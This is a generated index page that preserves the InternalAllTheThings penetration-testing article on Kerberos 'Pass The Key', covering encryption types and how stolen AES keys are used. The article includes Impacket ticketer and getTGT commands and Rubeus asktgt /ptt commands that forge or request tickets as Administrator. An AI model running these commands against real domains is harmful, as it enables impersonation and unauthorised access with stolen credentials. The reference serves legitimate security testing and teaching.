---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Hash - Pass The Key

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-hash-pass-the-key` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/hash-pass-the-key.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Hash - Pass The Key](../../topics/active-directory/hash-pass-the-key.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-hash-pass-the-key |
| name | Hash - Pass The Key |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/hash-pass-the-key.md |

## Preserved Source Material

````yaml
_body: "# Hash - Pass The Key\n\nPass The Key allows attackers to gain access to systems by using a valid session key instead\
  \ of the user's password or NTLM hash. This technique is related to other credential-based attacks like Pass The Hash (PTH)\
  \ and Pass The Ticket (PTT) but specifically uses session keys to authenticate.\n\nPre-authentication requires the requesting\
  \ user to provide a secret key, which is derived from their password and may use encryption algorithms such as DES, RC4,\
  \ AES128, or AES256.\n\n* **RC4**: ARCFOUR-HMAC-MD5 (23), in this format, this is the NTLM hash, go to **Pass The Hash**\
  \ to use it directly and **Over Pass The Hash** page to request a TGT from it.\n* **DES**: DES3-CBC-SHA1 (16), should not\
  \ be used anymore and have been deprecated since 2018 ([RFC 8429](https://www.rfc-editor.org/rfc/rfc8429)).\n* **AES128**:\
  \ AES128-CTS-HMAC-SHA1-96 (17), both AES encryption algorithms can be used with Impacket and Rubeus tools.\n* **AES256**:\
  \ AES256-CTS-HMAC-SHA1-96 (18)\n\nIn the past, there were more encryptions methods, that have now been deprecated.\n\n|\
  \ enctype                    | weak?| krb5   | Windows |\n| -------------------------- | ---- | ------ | ------- |  \n|\
  \ des-cbc-crc                | weak | <1.18  | >=2000  |\n| des-cbc-md4                | weak | <1.18  | ?       |\n| des-cbc-md5\
  \                | weak | <1.18  | >=2000  |\n| des3-cbc-sha1              |    | >=1.1  | none    |\n| arcfour-hmac   \
  \            |    | >=1.3  | >=2000  |\n| arcfour-hmac-exp           | weak | >=1.3  | >=2000  |\n| aes128-cts-hmac-sha1-96\
  \    |    | >=1.3  | >=Vista |\n| aes256-cts-hmac-sha1-96  |      | >=1.3  | >=Vista |\n| aes128-cts-hmac-sha256-128 | \
  \   | >=1.15 | none    |\n| aes256-cts-hmac-sha384-192 |    | >=1.15 | none    |\n| camellia128-cts-cmac    |      | >=1.9\
  \  | none    |\n| camellia256-cts-cmac    |      | >=1.9  | none    |\n\nMicrosoft Windows releases Windows 7 and later\
  \ disable single-DES enctypes by default.\n\nEither use the AES key to generate a ticket with `ticketer`, or request a new\
  \ TGT using `getTGT.py` script from Impacket.\n\n## Generate a new ticket\n\n* [fortra/impacket/ticketer.py](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)\n\
  \n    ```powershell\n    impacket-ticketer -aesKey 2ef70e1ff0d18df08df04f272df3f9f93b707e89bdefb95039cddbadb7c6c574 -domain\
  \ lab.local Administrator -domain-sid S-1-5-21-2218639424-46377867-3078535060\n    ```\n\n## Request a TGT\n\n* [fortra/impacket/getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py)\n\
  \n    ```powershell\n    impacket-getTGT -aesKey 2ef70e1ff0d18df08df04f272df3f9f93b707e89bdefb95039cddbadb7c6c574 lab.local\n\
  \    ```\n\n* [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)\n\n    ```powershell\n    .\\Rubeus.exe asktgt /user:Administrator\
  \ /aes128 bc09f84dcb4eabccb981a9f265035a72 /ptt\n    .\\Rubeus.exe asktgt /user:Administrator /aes256:2ef70e1ff0d18df08df04f272df3f9f93b707e89bdefb95039cddbadb7c6c574\
  \ /opsec /ptt\n    ```\n\n## References\n\n* [MIT Kerberos Documentation - Encryption types](https://web.mit.edu/kerberos/krb5-1.18/doc/admin/enctypes.html)"
_relative_path: active-directory/hash-pass-the-key.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/hash-pass-the-key.md
````
